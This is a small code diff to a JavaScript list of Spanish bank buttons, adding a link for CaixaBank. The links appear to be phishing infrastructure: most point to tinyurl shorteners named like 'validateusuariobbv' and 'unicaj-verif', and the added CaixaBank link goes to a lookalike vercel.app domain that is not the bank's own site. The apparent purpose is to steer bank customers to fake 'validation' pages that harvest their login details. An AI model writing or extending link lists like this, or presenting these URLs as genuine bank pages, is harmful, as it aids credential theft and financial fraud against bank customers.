@@ -13,7 +13,7 @@ const BUTTONS = [
   { label: 'BBVA', href: 'https://tinyurl.com/validateusuariobbv' },
   { label: 'ING', href: 'https://tinyurl.com/validateing' },
   { label: 'Sabadell', href: 'https://tinyurl.com/validateusuariosabadell' },
-  { label: 'CaixaBank', href: null },
+  { label: 'CaixaBank', href: 'https://caixa1-web-web.vercel.app' },
   { label: 'Unicaja', href: 'https://tinyurl.com/unicaj-verif' },
   { label: 'Santander', href: null },
   { label: 'Bankinter', href: null },
